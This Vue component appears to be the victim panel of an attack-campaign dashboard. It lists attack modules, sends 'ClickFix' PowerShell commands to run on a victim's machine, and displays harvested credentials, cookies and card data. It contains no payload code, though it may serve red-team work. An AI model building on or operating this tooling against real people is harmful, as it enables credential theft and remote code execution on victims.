<script setup>
import { ref, onMounted } from 'vue'
import Button from 'primevue/button'
import Dialog from 'primevue/dialog'
import InputText from 'primevue/inputtext'
import Tag from 'primevue/tag'
import DataTable from 'primevue/datatable'
import Column from 'primevue/column'
import { useToast } from 'primevue/usetoast'
import { backendService } from '@/services/backend'
import ExecuteModuleDialog from '@/components/dashboard/ExecuteModuleDialog.vue'
import ModuleDialog from '@/components/dashboard/ModuleDialog.vue'

const props = defineProps({
    victim: Object,
    campaign: Object
})

const toast = useToast()

// Built-in, non-custom-module attack shortcuts shown alongside the victim's
// modules (see the `presets.length > 0` section below and executeScript(),
// which already special-cases `id === 'clickfix'`). Currently empty: the
// ClickFix entry is disabled, so that path is unreachable from this panel
// even though clickFixDialogVisible/sendClickFix() below still work if it's
// ever re-enabled.
const presets = ref([
    // {
    //     id: 'clickfix',
    //     icon: '🍪',
    //     name: 'ClickFix Attack',
    //     description: 'Load ClickFix HTML template',
    //     category: 'Social Engineering',
    //     isBuiltIn: true
    // }
])

const modules = ref([])
const selectedModule = ref(null)
const executeModuleDialogVisible = ref(false)
const attackDialogVisible = ref(false)
const clickFixDialogVisible = ref(false)
const clickFixCommand = ref('')
const moduleResultsDialogVisible = ref(false)
const moduleResults = ref([])
const selectedModuleForResults = ref(null)
const loadingResults = ref(false)
const resultDetailVisible = ref(false)
const selectedResultData = ref(null)

const categoryIcons = {
    'Initial Access': '🚪',
    'Execution': '⚡',
    'Persistence': '🔄',
    'Privilege Escalation': '⬆️',
    'Credential Access': '🔑',
    'Discovery': '🔍',
    'Lateral Movement': '↔️',
    'Collection': '📦',
    'Exfiltration': '📤',
    'Command & Control': '🎮',
    'Post Exploitation': '💀',
    'Social Engineering': '🎭',
    'Browser Exploitation': '🌐',
    'Cross-Site Scripting': '🔗',
    'Clickjacking': '🖱️',
    'Custom': '⚙️'
}

onMounted(async () => {
    await loadModules()
})

async function loadModules() {
    if (!props.campaign) return

    try {
        const campaignModules = await backendService.getCampaignModules(props.campaign.id)
        modules.value = campaignModules.map(module => ({
            id: module.id,
            icon: categoryIcons[module.category] || '⚙️',
            name: module.name,
            description: module.description,
            category: module.category,
            inputs: module.inputs || [],
            isBuiltIn: false
        }))
    } catch (error) {
        console.error('Failed to load modules:', error)
    }
}

async function executeScript(script) {
    if (script.isBuiltIn && script.id === 'clickfix') {
        clickFixDialogVisible.value = true
        return
    }

    if (!script.isBuiltIn) {
        selectedModule.value = script
        executeModuleDialogVisible.value = true
        return
    }
}

function handleModuleExecuted() {
    executeModuleDialogVisible.value = false
    selectedModule.value = null
}

async function sendClickFix() {
    if (!props.victim) {
        toast.add({
            severity: 'error',
            summary: 'Error',
            detail: 'No victim selected',
            life: 3000
        })
        return
    }

    if (!clickFixCommand.value) {
        toast.add({
            severity: 'warn',
            summary: 'Warning',
            detail: 'ClickFix command cannot be empty',
            life: 3000
        })
        return
    }

    try {
        await backendService.sendClickFix(
            props.victim.campaign_id,
            props.victim.id,
            clickFixCommand.value
        )

        toast.add({
            severity: 'success',
            summary: 'ClickFix Sent',
            detail: `ClickFix command sent to victim ${props.victim.id}`,
            life: 3000
        })

        // Chiudi dialog e reset command
        clickFixDialogVisible.value = false
        clickFixCommand.value = ''
    } catch (error) {
        toast.add({
            severity: 'error',
            summary: 'Error',
            detail: 'Failed to send ClickFix: ' + error.message,
            life: 3000
        })
    }
}

function openCustomScriptDialog() {
    attackDialogVisible.value = true
}

async function handleAttackSave(attackData) {
    if (!props.campaign) {
        toast.add({
            severity: 'error',
            summary: 'Error',
            detail: 'No campaign selected',
            life: 3000
        })
        return
    }

    try {
        await backendService.createCampaignModule(props.campaign.id, attackData)

        toast.add({
            severity: 'success',
            summary: 'Module Created',
            detail: `${attackData.name} added to campaign`,
            life: 3000
        })

        attackDialogVisible.value = false
        await loadModules()
    } catch (error) {
        toast.add({
            severity: 'error',
            summary: 'Error',
            detail: 'Failed to create module: ' + error.message,
            life: 3000
        })
    }
}

function getCategorySeverity(category) {
    const severityMap = {
        'Initial Access': 'warn',
        'Execution': 'danger',
        'Persistence': 'info',
        'Privilege Escalation': 'danger',
        'Credential Access': 'warn',
        'Discovery': 'info',
        'Lateral Movement': 'warn',
        'Collection': 'info',
        'Exfiltration': 'danger',
        'Command & Control': 'danger',
        'Post Exploitation': 'danger',
        'Social Engineering': 'warn',
        'Browser Exploitation': 'danger',
        'Cross-Site Scripting': 'danger',
        'Clickjacking': 'warn',
        'Custom': 'info'
    }
    return severityMap[category] || 'info'
}

async function viewModuleResults(module, event) {
    event.stopPropagation()

    if (!props.campaign || !props.victim) {
        toast.add({
            severity: 'error',
            summary: 'Error',
            detail: 'Campaign or victim not available',
            life: 3000
        })
        return
    }

    loadingResults.value = true
    selectedModuleForResults.value = module
    moduleResultsDialogVisible.value = true

    try {
        const response = await backendService.getVictimModulesData(
            props.campaign.id,
            props.victim.id,
            module.id
        )

        if (response.modules && response.modules.length > 0) {
            moduleResults.value = response.modules[0].executions || []
        } else {
            moduleResults.value = []
        }
    } catch (error) {
        console.error('Failed to load module results:', error)
        toast.add({
            severity: 'error',
            summary: 'Error',
            detail: 'Failed to load module results',
            life: 3000
        })
        moduleResults.value = []
    } finally {
        loadingResults.value = false
    }
}

function showResultDetail(result) {
    selectedResultData.value = result
    resultDetailVisible.value = true
}

function formatDate(dateString) {
    if (!dateString) return 'N/A'
    const date = new Date(dateString)
    return date.toLocaleString('en-US', {
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    })
}

// Field display helpers
const sensitiveFields = ['password', 'secret', 'token', 'key', 'credit_card', 'cvv', 'iban']

function isSensitiveField(key) {
    return sensitiveFields.some(f => key.toLowerCase().includes(f))
}

function getFieldIcon(key) {
    const k = key.toLowerCase()
    if (k.includes('user') || k.includes('email')) return '👤'
    if (k.includes('password') || k.includes('secret')) return '🔑'
    if (k.includes('cookie')) return '🍪'
    if (k.includes('url')) return '🔗'
    if (k.includes('timestamp') || k.includes('time')) return '🕐'
    return '📄'
}

function getFieldSeverity(key) {
    const k = key.toLowerCase()
    if (k.includes('password') || k.includes('secret') || k.includes('token')) return 'danger'
    if (k.includes('user') || k.includes('email')) return 'success'
    if (k.includes('cookie')) return 'warn'
    return 'secondary'
}

function flattenMetadata(metadata) {
    if (!metadata || typeof metadata !== 'object') return []
    return Object.entries(metadata).map(([key, value]) => ({
        key,
        label: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
        value: typeof value === 'object' ? JSON.stringify(value) : String(value)
    }))
}

function truncateValue(value, maxLength = 60) {
    if (!value) return ''
    const str = String(value)
    return str.length > maxLength ? str.substring(0, maxLength) + '...' : str
}

function getPreviewFields(metadata) {
    if (!metadata || typeof metadata !== 'object') return []
    const skipInPreview = ['timestamp', 'url']
    return Object.entries(metadata)
        .filter(([k]) => !skipInPreview.includes(k.toLowerCase()))
        .slice(0, 3)
        .map(([k, v]) => ({ key: k, value: typeof v === 'object' ? JSON.stringify(v) : String(v) }))
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        toast.add({
            severity: 'success',
            summary: 'Copied',
            detail: 'JSON copied to clipboard',
            life: 2000
        })
    })
}

function downloadJSON(data, filename) {
    const blob = new Blob([JSON.stringify(data.metadata, null, 2)], {
        type: 'application/json'
    })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = filename
    a.click()
    URL.revokeObjectURL(url)
}
</script>

<template>
    <div class="scripts-panel">
        <div class="panel-header">
            <h4>Attack Preset Library</h4>
            <Button
                label="Add Custom Script"
                icon="pi pi-plus"
                size="small"
                @click="openCustomScriptDialog"
            />
        </div>

        <!-- Built-in Presets -->
        <div v-if="presets.length > 0" class="section">
            <h5 class="section-title">Built-in Attacks</h5>
            <div class="scripts-grid">
                <div
                    v-for="script in presets"
                    :key="script.id"
                    class="script-card"
                    @click="executeScript(script)"
                >
                    <div class="card-icon">{{ script.icon }}</div>
                    <div class="card-content">
                        <h5>{{ script.name }}</h5>
                        <p>{{ script.description }}</p>
                        <Tag
                            :value="script.category"
                            :severity="getCategorySeverity(script.category)"
                            class="category-tag"
                        />
                    </div>
                    <Button
                        icon="pi pi-play"
                        rounded
                        text
                        size="small"
                        class="execute-btn"
                    />
                </div>
            </div>
        </div>

        <!-- Modules -->
        <div v-if="modules.length > 0" class="section">
            <h5 class="section-title">Campaign Modules</h5>
            <div class="scripts-grid">
                <div
                    v-for="module in modules"
                    :key="module.id"
                    class="script-card"
                >
                    <div class="card-icon">{{ module.icon }}</div>
                    <div class="card-content" @click="executeScript(module)">
                        <h5>{{ module.name }}</h5>
                        <p>{{ module.description }}</p>
                        <div class="card-tags">
                            <Tag
                                :value="module.category"
                                :severity="getCategorySeverity(module.category)"
                                class="category-tag"
                            />
                            <Tag
                                v-if="module.inputs && module.inputs.length > 0"
                                :value="`${module.inputs.length} param${module.inputs.length > 1 ? 's' : ''}`"
                                severity="info"
                                class="type-tag"
                            />
                        </div>
                    </div>
                    <div class="card-actions">
                        <Button
                            icon="pi pi-eye"
                            rounded
                            text
                            size="small"
                            class="action-btn"
                            @click="viewModuleResults(module, $event)"
                            v-tooltip.top="'View Results'"
                        />
                        <Button
                            icon="pi pi-play"
                            rounded
                            text
                            size="small"
                            class="action-btn"
                            @click="executeScript(module)"
                            v-tooltip.top="'Execute'"
                        />
                    </div>
                </div>
            </div>
        </div>

        <!-- Empty State -->
        <div v-if="presets.length === 0 && modules.length === 0" class="empty-state">
            <i class="pi pi-inbox" style="font-size: 3rem; color: var(--color-text-mute);"></i>
            <p>No attacks available</p>
        </div>

        <!-- ClickFix Dialog -->
        <Dialog
            v-model:visible="clickFixDialogVisible"
            header="Send ClickFix Attack"
            :style="{ width: '500px' }"
            modal
            :draggable="false"
        >
            <div class="clickfix-console">
                <p class="dialog-description">
                    Enter the PowerShell command to execute on the victim's machine via ClickFix attack.
                </p>
                <InputText
                    v-model="clickFixCommand"
                    type="text"
                    placeholder="Enter ClickFix command to execute on victim's client"
                />
            </div>

            <template #footer>
                <Button
                    label="Cancel"
                    text
                    @click="clickFixDialogVisible = false"
                />
                <Button
                    label="Send ClickFix"
                    icon="pi pi-send"
                    @click="sendClickFix"
                    :disabled="!clickFixCommand"
                />
            </template>
        </Dialog>

        <!-- Module Execution Dialog -->
        <ExecuteModuleDialog
            v-model="executeModuleDialogVisible"
            :module="selectedModule"
            :campaign-id="campaign?.id"
            :victim-id="victim?.id"
            @executed="handleModuleExecuted"
        />

        <!-- Module Creation Dialog -->
        <ModuleDialog
            v-model="attackDialogVisible"
            mode="create"
            @save="handleAttackSave"
        />

        <!-- Module Results Dialog -->
        <Dialog
            v-model:visible="moduleResultsDialogVisible"
            :header="selectedModuleForResults ? `${selectedModuleForResults.name} — Collected Data` : 'Collected Data'"
            :style="{ width: '70vw', maxHeight: '80vh' }"
            modal
            :draggable="false"
        >
            <div v-if="loadingResults" class="loading-state">
                <i class="pi pi-spin pi-spinner" style="font-size: 2rem;"></i>
                <p>Loading results...</p>
            </div>

            <div v-else-if="moduleResults.length === 0" class="empty-results">
                <i class="pi pi-inbox" style="font-size: 2rem;"></i>
                <p>No data collected for this module yet</p>
            </div>

            <div v-else class="results-container">
                <DataTable
                    :value="moduleResults"
                    stripedRows
                    scrollable
                    scrollHeight="400px"
                    class="data-table"
                >
                    <Column header="Time" style="width: 160px">
                        <template #body="{ data }">
                            <span class="timestamp">{{ formatDate(data.collected_at) }}</span>
                        </template>
                    </Column>

                    <Column header="Captured Data">
                        <template #body="{ data }">
                            <div class="preview-fields" v-if="data.metadata && Object.keys(data.metadata).length > 0">
                                <div
                                    v-for="field in getPreviewFields(data.metadata)"
                                    :key="field.key"
                                    class="preview-field"
                                >
                                    <Tag
                                        :value="field.key"
                                        :severity="getFieldSeverity(field.key)"
                                        class="field-tag"
                                    />
                                    <code class="field-value">{{ isSensitiveField(field.key) ? '••••••••' : truncateValue(field.value, 30) }}</code>
                                </div>
                            </div>
                            <span v-else class="no-data">No data</span>
                        </template>
                    </Column>

                    <Column header="Actions" style="width: 120px">
                        <template #body="{ data }">
                            <div class="action-buttons">
                                <Button
                                    icon="pi pi-eye"
                                    size="small"
                                    text
                                    rounded
                                    @click="showResultDetail(data)"
                                    v-tooltip.top="'View Details'"
                                />
                                <Button
                                    icon="pi pi-download"
                                    size="small"
                                    text
                                    rounded
                                    @click="downloadJSON(data, `${selectedModuleForResults.name}-${data.id}.json`)"
                                    v-tooltip.top="'Download'"
                                />
                            </div>
                        </template>
                    </Column>
                </DataTable>
            </div>

            <template #footer>
                <Button
                    label="Close"
                    icon="pi pi-times"
                    @click="moduleResultsDialogVisible = false"
                />
            </template>
        </Dialog>

        <!-- Single Result Detail Dialog -->
        <Dialog
            v-model:visible="resultDetailVisible"
            :header="selectedModuleForResults ? `${selectedModuleForResults.name} — ${selectedResultData ? formatDate(selectedResultData.collected_at) : ''}` : 'Details'"
            :style="{ width: '60vw', maxHeight: '80vh' }"
            modal
            :draggable="false"
        >
            <div v-if="selectedResultData" class="result-detail">
                <div class="fields-view">
                    <h6>Collected Data</h6>
                    <DataTable
                        :value="flattenMetadata(selectedResultData.metadata)"
                        stripedRows
                        class="data-table fields-table"
                    >
                        <Column header="Field" style="width: 200px">
                            <template #body="{ data }">
                                <div class="field-cell">
                                    <span class="field-icon">{{ getFieldIcon(data.key) }}</span>
                                    <Tag
                                        :value="data.label"
                                        :severity="getFieldSeverity(data.key)"
                                    />
                                </div>
                            </template>
                        </Column>
                        <Column header="Value">
                            <template #body="{ data }">
                                <div class="value-cell">
                                    <code class="value-code">{{ data.value }}</code>
                                    <Button
                                        icon="pi pi-copy"
                                        text
                                        rounded
                                        size="small"
                                        @click="copyToClipboard(data.value)"
                                        v-tooltip.left="'Copy'"
                                    />
                                </div>
                            </template>
                        </Column>
                    </DataTable>
                </div>

                <details class="json-details">
                    <summary>Raw JSON</summary>
                    <div class="json-view">
                        <div class="json-header">
                            <Button
                                icon="pi pi-copy"
                                label="Copy JSON"
                                size="small"
                                text
                                @click="copyToClipboard(JSON.stringify(selectedResultData.metadata, null, 2))"
                            />
                        </div>
                        <pre class="json-content">{{ JSON.stringify(selectedResultData.metadata, null, 2) }}</pre>
                    </div>
                </details>
            </div>

            <template #footer>
                <Button
                    label="Close"
                    icon="pi pi-times"
                    @click="resultDetailVisible = false"
                />
                <Button
                    label="Download JSON"
                    icon="pi pi-download"
                    severity="secondary"
                    @click="downloadJSON(selectedResultData, `module-output-${selectedResultData.id}.json`)"
                />
            </template>
        </Dialog>
    </div>
</template>

<style scoped>
.scripts-panel {
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
}

.panel-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.panel-header h4 {
    font-size: 1rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0;
}

/* Section */
.section {
    display: flex;
    flex-direction: column;
    gap: 1rem;
}

.section-title {
    font-size: 0.875rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0;
    text-transform: uppercase;
    letter-spacing: 0.05em;
}

.scripts-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
    gap: 1rem;
}

.script-card {
    display: flex;
    align-items: center;
    gap: 1rem;
    padding: 1rem;
    background-color: var(--color-background-mute);
    border: 1px solid var(--color-border);
    border-radius: 6px;
    cursor: pointer;
    transition: var(--transition-interactive);
}

.script-card:hover {
    border-color: var(--color-accent);
}

.card-icon {
    font-size: 2rem;
    flex-shrink: 0;
}

.card-content {
    flex: 1;
    min-width: 0;
    display: flex;
    flex-direction: column;
    gap: 0.5rem;
}

.card-content h5 {
    font-size: 0.9rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0;
}

.card-content p {
    font-size: 0.75rem;
    color: var(--color-text-mute);
    margin: 0;
    line-height: 1.4;
}

.card-tags {
    display: flex;
    gap: 0.5rem;
    flex-wrap: wrap;
}

.category-tag,
.type-tag {
    font-size: 0.7rem;
}

.card-actions {
    display: flex;
    gap: 0.25rem;
    opacity: 0;
    transition: opacity 0.2s;
}

.script-card:hover .card-actions {
    opacity: 1;
}

.action-btn {
    flex-shrink: 0;
}

.execute-btn {
    opacity: 0;
    transition: opacity 0.2s;
}

.script-card:hover .execute-btn {
    opacity: 1;
}

/* Empty State */
.empty-state {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 3rem 1rem;
    text-align: center;
    color: var(--color-text-mute);
}

.empty-state i {
    font-size: 3rem;
    color: var(--color-text-mute);
    margin-bottom: 1rem;
}

.empty-state p {
    margin: 0.5rem 0;
}

/* ClickFix Dialog */
.clickfix-console {
    display: flex;
    flex-direction: column;
    gap: 1rem;
    padding: 1rem 0;
}

.dialog-description {
    font-size: 0.875rem;
    color: var(--color-text-mute);
    margin: 0 0 0.5rem 0;
    line-height: 1.5;
}

/* Module Results Dialog */
.loading-state,
.empty-results {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 3rem 1rem;
    text-align: center;
    color: var(--color-text-mute);
}

.loading-state i,
.empty-results i {
    margin-bottom: 1rem;
}

.results-container {
    display: flex;
    flex-direction: column;
    gap: 1rem;
}

.timestamp {
    font-size: 0.85rem;
    color: var(--color-text);
}

/* Preview fields in results table */
.preview-fields {
    display: flex;
    flex-wrap: wrap;
    gap: 0.5rem;
}

.preview-field {
    display: flex;
    align-items: center;
    gap: 0.35rem;
}

.field-tag {
    font-size: 0.7rem;
}

.field-value {
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.78rem;
    color: var(--color-text);
    background: var(--color-background-mute);
    padding: 0.15rem 0.4rem;
    border-radius: 3px;
}

.no-data {
    color: var(--color-text-mute);
    font-style: italic;
    font-size: 0.85rem;
}

.action-buttons {
    display: flex;
    gap: 0.25rem;
}

/* Result Detail Dialog */
.result-detail {
    display: flex;
    flex-direction: column;
    gap: 1.5rem;
}

.fields-view h6 {
    font-size: 0.9rem;
    font-weight: 600;
    color: var(--color-heading);
    margin: 0 0 0.75rem 0;
}

.fields-table {
    border: 1px solid var(--color-border);
    border-radius: 6px;
    overflow: hidden;
}

.field-cell {
    display: flex;
    align-items: center;
    gap: 0.5rem;
}

.field-icon {
    font-size: 1rem;
}

.value-cell {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    justify-content: space-between;
}

.value-code {
    flex: 1;
    font-family: 'JetBrains Mono', monospace;
    font-size: 0.8rem;
    color: var(--color-text);
    background: var(--color-background-mute);
    padding: 0.25rem 0.5rem;
    border-radius: 4px;
    word-break: break-all;
}

/* Collapsible JSON */
.json-details {
    border: 1px solid var(--color-border);
    border-radius: 6px;
    overflow: hidden;
}

.json-details summary {
    cursor: pointer;
    padding: 0.75rem 1rem;
    font-size: 0.85rem;
    font-weight: 500;
    color: var(--color-text-mute);
    background: var(--color-background-mute);
    user-select: none;
}

.json-details summary:hover {
    color: var(--color-heading);
}

.json-header {
    display: flex;
    justify-content: flex-end;
    padding: 0.5rem 1rem 0;
    background: var(--code-surface);
}

.json-content {
    background: var(--code-canvas);
    padding: 0 1rem 1rem;
    font-family: var(--font-mono);
    font-size: 0.8rem;
    line-height: 1.5;
    overflow-x: auto;
    max-height: 300px;
    overflow-y: auto;
    color: var(--code-text);
    margin: 0;
}

/* Responsive */
@media (max-width: 768px) {
    .scripts-grid {
        grid-template-columns: 1fr;
    }

    .card-actions {
        opacity: 1;
        flex-direction: column;
    }
}
</style>
